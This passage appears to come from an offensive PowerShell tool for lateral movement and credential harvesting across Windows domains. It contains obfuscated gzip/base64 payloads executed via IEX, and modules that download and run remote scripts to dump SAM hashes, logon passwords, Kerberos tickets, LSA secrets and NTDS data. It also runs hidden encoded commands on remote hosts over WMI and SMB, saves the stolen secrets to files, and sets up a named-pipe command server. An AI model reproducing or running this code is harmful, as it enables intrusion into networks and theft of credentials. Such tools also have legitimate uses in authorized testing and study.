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";$a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress);$c=New-Object System.IO.MemoryStream;$b.CopyTo($c);$d=[System.Text.Encoding]::UTF8.GetString($c.ToArray());$b.Close();$a.Close();$c.Close();$d|IEX}DumpSAM
'@

$Mongoose = @'
Function Invoke-Mongoose{$gz="H4sIAAAAAAAEACVQ30vDMBB+F/wfQhhcytqydeqDPlXMRmHK3NrhFCHdzEYh7dSm4iz5373L+pDcfc33426ldB5lVumaCQZrGEK5BDZkDLKUbgFbI2/HiH8lEDCPdK/Y/lIXIOkt33zKd8EY78euHzkeTWEKIXxLoAf46o7hJ+iYaRv9lN+ZStX9XBIoYPyMaknhxeHvxZNYtC7nWMQ8VW2rZL01Jx7zmcxVvlELzYX3u3H9xJHrlesT8u6vHWfRXkBhK1Q1EISQQiggrbFtK+wFxI9lQ3MeNJ61ptrG/k9H5ZHQ0lbHhkBoib46tRZhXZ+HxlwHpe1eVdI8cEFzcHJPKMw5QEkq3hA+SCHDvqnslIwro71O6IdIfPyRn2Pi2biUFSUpLdEroj8dKeai2xq8vOoOV7wLaVuYppUqV7iyQlKaQd+oYm5cOOitWnbSseDy4h/XHGik6QEAAA=="
$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg($gz));$b=New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::deCOmPreSs);$c=New-Object System.IO.MemoryStream;$b.COpYTo($c);$d=[System.Text.Encoding]::UTF8.GETSTrIng($c.ToArray());$b.ClOse();$a.ClosE();$c.cLose();$d|IEX}"";Invoke-Mongoose
'@


################################################################################################################
######################################## Command and Module logic ## ###########################################
################################################################################################################

# Tickets
if ($Module -eq "Tickets"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""tickets"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Tickets - KerbDump
if ($Module -eq "KerbDump"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ;IEX(New-Object System.Net.WebClient).DownloadString(""$KirbyURL"")"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LogonPasswords
elseif ($Module -eq "LogonPasswords"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""dump"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# NTDS
elseif ($Module -eq "NTDS"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ; IEX(New-Object System.Net.WebClient).DownloadString(""$NTDSURL"");Invoke-NTDS"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# eKeys
elseif ($Module -eq "ekeys"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""ekeys"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# LSA
elseif ($Module -eq "LSA"){
$b64 = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 ; try {$Mongoose}catch{} ;IEX(New-Object System.Net.WebClient).DownloadString(""$PandemoniumURL"");Invoke-Pandemonium -Command ""LSA"""
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# SAM
elseif ($Module -eq "SAM"){
$b64 = "$LocalSAM"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Disks
elseif ($Module -eq "disks"){
$b64 = 'Get-Volume | Where-Object { $_.DriveLetter -ne "" -and $_.FileSystemLabel -ne "system reserved" } | Select-Object DriveLetter, FileSystemLabel, DriveType, @{Name="Size (GB)";Expression={$_.Size / 1GB -replace "\..*"}} | FL'
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# LoggedOnUsers
elseif ($Module -eq "LoggedOnUsers"){
$b64 = "Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName; Write-Host"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# Sessions
elseif ($Module -eq "Sessions"){
$b64 = "Write-host; query user | Out-String"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
# Set module to "" for modules where we do not wish to save output for
$Module = ""
}

# ConsoleHistory
elseif ($Module -eq "ConsoleHistory"){
$b64 = "$ConsoleHostHistory"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

# Files
elseif ($Module -eq "Files"){
$b64 = "$Files"
$base64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($b64))
$Command = "powershell.exe -ep bypass -enc $base64command"
}

elseif ($Module -eq "" -and $Command -ne ""){
$base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
$Command = "powershell.exe -ep bypass -enc $base64Command"
}


################################################################################################################
################################# Logic to help keep output tidy and even ######################################
################################################################################################################

if ($Method -ne "Spray"){
$NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
$OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
}

################################################################################################################
################################################ Function: WMI #################################################
################################################################################################################
Function Method-WMIexec {
param ($ComputerName)
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList


$scriptBlock = {
    param ($computerName, $Command, $Username, $Password, $LocalAuth)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect"}


    
    Function LocalWMI {

param (
    [string]$Command = "",
    [string]$Username = "",
    [string]$Password = "",
    [string]$ComputerName = "",
    [switch]$LocalAuth = $true,
    [string]$Class = "PMEClass"
)

$LocalUsername = "$ComputerName\$UserName"
$LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($LocalUsername,$LocalPassword)
$osInfo = $null

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue" -Credential $cred
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}


#Check access
$ErrorActionPreference = "silentlycontinue"
$osInfo = $null  # Reset $osInfo variable before each iteration

# OSinfo
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -Credential $Cred

# If OSinfo true and command empty
if ($osinfo -and $Command -eq ""){
$result =  "Reminder to move this outside of runspace"
return $result

}

# If OSinfo true and command not empty
elseif ($osinfo -and $Command -ne ""){

if ($LocalAuth){	
	function CreateScriptInstance([string]$ComputerName, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred
    
    if (!$classCheck) {Write-Host "ClassCheck"
$Code = "CgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACIAXABcACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQBcAHIAbwBvAHQAXABjAGkAbQB2ADIAIgAsAFsAcw
B0AHIAaQBuAGcAXQA6ADoARQBtAHAAdAB5ACwAJABuAHUAbABsACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAFsAIgBfAF8AQwBMAEEAUwBTACIAXQAgAD0AIAAiAFAATQBFAEMAbABhAHMAcwAiAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFEAdQBhAGwAaQBmAGkAZQByAHMALgBBAGQAZAAoACIAUwB0AGEAdABpAGMAIgAs
ACQAdAByAHUAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMALgBBAGQAZAAoACIAQwBvAG0AbQBhAG4AZABJAGQAIgAsAFsAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQwBpAG0AVAB5AHAAZQBdADoAOgBTAHQAcgBpAG4AZwAsACQAZgBhAGwAcwBlACkACgAgACAAIAAgAC
QAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAQwBvAG0AbQBhAG4AZABJAGQAIgBdAC4AUQB1AGEAbABpAGYAaQBlAHIAcwAuAEEAZABkACgAIgBLAGUAeQAiACwAJAB0AHIAdQBlACkACgAgACAAIAAgACQAbgBlAHcAQwBsAGEAcwBzAC4AUAByAG8AcABlAHIAdABpAGUAcwAuAEEAZABkACgAIgBDAG8AbQBtAGEA
bgBkAE8AdQB0AHAAdQB0ACIALABbAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEMAaQBtAFQAeQBwAGUAXQA6ADoAUwB0AHIAaQBuAGcALAAkAGYAYQBsAHMAZQApAAoAIAAgACAAIAAkAG4AZQB3AEMAbABhAHMAcwAuAFAAdQB0ACgAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgA="


$CommandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand $Code"
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred



# Required, if we proceed to quickly the class will not register and cause a break. Should probably loop this so we can move on as soon as the class is created
Start-Sleep -Seconds "10"
    
    }
    elseif ($classCheck -ne $null){
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred

    
    $wmiInstance.GetType() | Out-Null
    $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
    $wmiInstance.Dispose()
    return $CommandId
    }
}

$Commandid = CreateScriptInstance $ComputerName $cred $Class $LocalAuth


function GetScriptOutput([string]$ComputerName, [string]$CommandId, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    try {
            $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'" -Credential $cred 
        
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {
        Write-Host "Failed"
        #Write-Error $_.Exception.Message
    } 
    finally {
        if ($wmiInstance) {
            $wmiInstance.Dispose()
        }
    }
}

function ExecCommand([string]$ComputerName, [string]$Command, [System.Management.Automation.PSCredential]$cred, [string]$Class, [bool]$LocalAuth) {
    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
    
    $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred
 
    if ($process.ReturnValue -eq 0) {
        $started = Get-Date
        Do {
            if ($started.AddMinutes(2) -lt (Get-Date)) {
                Write-Host "PID: $($process.ProcessId) - Response took too long."
                break
            }
    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred
            
            Start-Sleep -Seconds 1
        } While ($watcher -ne $null)
        $scriptOutput = GetScriptOutput $ComputerName $ScriptCommandID $cred $Class $LocalAuth
        return $scriptOutput
    }
}

$commandString = $Command
$scriptCommandId = CreateScriptInstance $ComputerName $cred $Class $LocalAuth
if ($scriptCommandId -eq $null) {
    Write-Host "Script Command ID Failed" -ForegroundColor "Red"
}
$encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
$result = ExecCommand $ComputerName $encodedCommand $Cred $Class $LocalAuth
$wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"  -Credential $cred
Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName  -Credential $cred
return $result
}



}

elseif (!$osinfo){
    if ($SuccessOnly){return} 
        elseif (!$SuccessOnly) {

               return "Access Denied"
            }
        }
}
    if ($LocalAuth) {return LocalWMI -Username $Username -Password $Password -ComputerName $computerName -Command $Command}
    
    Function WMI {

param (
  [string]$Command = "",
  [string]$ComputerName,
  [string]$Class = "PMEClass"
)

if ($Command -eq ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"} elseif ($osInfo){return "Successful Connection PME"}
}

if ($Command -ne ""){
$osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName  -ErrorAction "SilentlyContinue"
    if (!$osInfo){return "Access Denied"}
}

function CreateScriptInstance([string]$ComputerName) {
        $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2"
        if ($classCheck -eq $null) {
            $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
            $newClass["__CLASS"] = "$Class"
            $newClass.Qualifiers.Add("Static",$true)
            $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
            $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
            $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
            $newClass.Put() | Out-Null
        }
        $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName
        $wmiInstance.GetType() | Out-Null
        $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
        $wmiInstance.Dispose()
        return $CommandId
        
    }

function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
    try {
        $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
        $result = $wmiInstance.CommandOutput
        $wmiInstance.Dispose()
        return $result
    } 
    catch {Write-Error $_.Exception.Message} 
    finally {if ($wmiInstance) {$wmiInstance.Dispose()}}
}


    function ExecCommand([string]$ComputerName, [string]$Command) {
        $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
        $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
        if ($process.ReturnValue -eq 0) {
            $started = Get-Date
            Do {
                if ($started.AddMinutes(2) -lt (Get-Date)) {
                    Write-Host "PID: $($process.ProcessId) - Response took too long."
                    break
                }
                $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                Start-Sleep -Seconds 1
            } While ($watcher -ne $null)
            $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
            return $scriptOutput
        }
    }

    $commandString = $Command
    $scriptCommandId = CreateScriptInstance $ComputerName
    if ($scriptCommandId -eq $null) {
        Write-Error "Error creating remote instance."
    }
    $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class $Class -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
    $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
    $result = ExecCommand $ComputerName $encodedCommand
    $wmiClass = Get-WmiObject -Class $Class -ComputerName $ComputerName -Namespace "root\cimv2"
    Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName | Out-Null
    return $result

    

}
    if (!$LocalAuth) {return WMI -ComputerName $computerName -Command $Command}

}

function Display-ComputerStatus {
    param (
        [string]$ComputerName,
        [string]$OS,
        [System.ConsoleColor]$statusColor = 'White',
        [string]$statusSymbol = "",
        [string]$statusText = "",
        [int]$NameLength,
        [int]$OSLength
    )

    # Prefix
    Write-Host "WMI " -ForegroundColor Yellow -NoNewline
    Write-Host "   " -NoNewline
    
    # Resolve IP
    $IP = $null
    $Ping = New-Object System.Net.NetworkInformation.Ping 
    $Result = $Ping.Send($ComputerName, 15)
    if ($Result.Status -eq 'Success') {
    $IP = $Result.Address.IPAddressToString
    Write-Host ("{0,-16}" -f $IP) -NoNewline
    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
    
    # Display ComputerName and OS
    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
    Write-Host "   " -NoNewline
    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
    Write-Host "   " -NoNewline

    # Display status symbol and text
    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
    Write-Host $statusText
}

# Create and invoke runspaces for each computer
# Filter non-candidate systems before wasting processing power on creating runspaces
foreach ($computer in $computers) {
    $ComputerName = $computer.Properties["dnshostname"][0]
    $OS = $computer.Properties["operatingSystem"][0]


        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth)
        $runspace.RunspacePool = $runspacePool

        [void]$runspaces.Add([PSCustomObject]@{
            Runspace = $runspace
            Handle = $runspace.BeginInvoke()
            ComputerName = $ComputerName
            OS = $OS
            Completed = $false
        })
    }




# Poll the runspaces and display results as they complete
do {
    foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
        
        if ($runspace.Handle.IsCompleted) {
            $runspace.Completed = $true
            $result = $runspace.Runspace.EndInvoke($runspace.Handle)
            $hasDisplayedResult = $false
            $result = $result.trim()

            # [other conditions for $result]
            if ($result -eq "Access Denied") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Unspecified Error") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ERROR" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
            elseif ($result -eq "Timed Out") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "TIMED OUT" -NameLength $NameLength -OSLength $OSLength
                continue
            }
            
            elseif ($result -eq "NotDomainController" -and $Module -eq "NTDS") {
                if ($successOnly) { continue }
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NON-DOMAIN CONTROLLER" -NameLength $NameLength -OSLength $OSLength
                continue
            } 
                         
            elseif ($result -eq "Successful Connection PME") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            } 
            
            elseif ($result -eq "Unable to connect") {}

            elseif ($result -match "[a-zA-Z0-9]") {
                
                if ($result -eq "No Results") {
                    if ($successOnly) { continue }
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Yellow" -statusSymbol "[*] " -statusText "NO RESULTS" -NameLength $NameLength -OSLength $OSLength
                } 
                else {
                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength

                    $filePath = switch ($Module) {
                        "SAM"            { "$SAM\$($runspace.ComputerName)-SAMHashes.txt" }
                        "LogonPasswords" { "$LogonPasswords\$($runspace.ComputerName)-LogonPasswords.txt" }
                        "Tickets"        { "$MimiTickets\$($runspace.ComputerName)-Tickets.txt" }
                        "eKeys"          { "$eKeys\$($runspace.ComputerName)-eKeys.txt" }
                        "KerbDump"       { "$KerbDump\$($runspace.ComputerName)-Tickets-KerbDump.txt" }
                        "LSA"            { "$LSA\$($runspace.ComputerName)-LSA.txt" }
                        "ConsoleHistory" { "$ConsoleHistory\$($runspace.ComputerName)-ConsoleHistory.txt" }
                        "Files"          { "$UserFiles\$($runspace.ComputerName)-UserFiles.txt" }
                        "NTDS"           { "$NTDS\$($runspace.ComputerName)-NTDS.txt"}
                        default          { $null }
                    }

                    if ($filePath) {
                        $result | Out-File -FilePath $filePath -Encoding "ASCII"
                        
                        if ($ShowOutput) {
                            $result | Write-Host
                            Write-Host
                            $hasDisplayedResult = $true
                        }
                    }

                    # Handle the default case.
                    if (-not $Module -and -not $hasDisplayedResult) {
                        $result | Write-Host
                        Write-Host
                        $hasDisplayedResult = $true
                    }
                }
            } 
            elseif ($result -notmatch "[a-zA-Z0-9]") {
                Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor Green -statusSymbol "[+] " -statusText "SUCCESS" -NameLength $NameLength -OSLength $OSLength
            }

             # Dispose of runspace and close handle
            $runspace.Runspace.Dispose()
            $runspace.Handle.AsyncWaitHandle.Close()
        }
    }

    Start-Sleep -Milliseconds 100
} while ($runspaces | Where-Object { -not $_.Completed })

# Clean up
$runspacePool.Close()
$runspacePool.Dispose()



}

################################################################################################################
############################################## Function: SMB ################################################
################################################################################################################
Function Method-SMB{
Write-host

$runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
$runspacePool.Open()
$runspaces = New-Object System.Collections.ArrayList

$scriptBlock = {
    param($ComputerName, $Command)
    
$tcpClient = New-Object System.Net.Sockets.TcpClient
$asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 

if ($wait) { 
    try {
        $tcpClient.EndConnect($asyncResult)
        $connected = $true
    } catch {
        $connected = $false
    }
} else {
    $connected = $false
}

$tcpClient.Close()
if (!$connected) {return "Unable to connect" }   
    
$SMBCheck = $false
$SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction "SilentlyContinue"

if (!$SMBCheck) {
    return "Access Denied"
}

if ([string]::IsNullOrWhiteSpace($Command)) {
    return "Successful connection PME"
}




    
    function Enter-SMBSession {

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[string]$Timeout = "45000"
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1028, 1028, `$null)
`$pipeServer.WaitForConnection()
`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)
while (`$true) {
	if (-not `$pipeServer.IsConnected) {
		break
	}
	`$command = `$sr.ReadLine()
	if (`$command -eq "exit") {break} 
	else {
		try{
			`$result = Invoke-Expression `$command | Out-String
			`$result -split "`n" | ForEach-Object {`$sw.WriteLine(`$_.TrimEnd())}
		} catch {
			`$errorMessage = `$_.Exception.Message
			`$sw.WriteLine(`$errorMessage)
		}
		`$sw.WriteLine("###END###")
		`$sw.Flush()
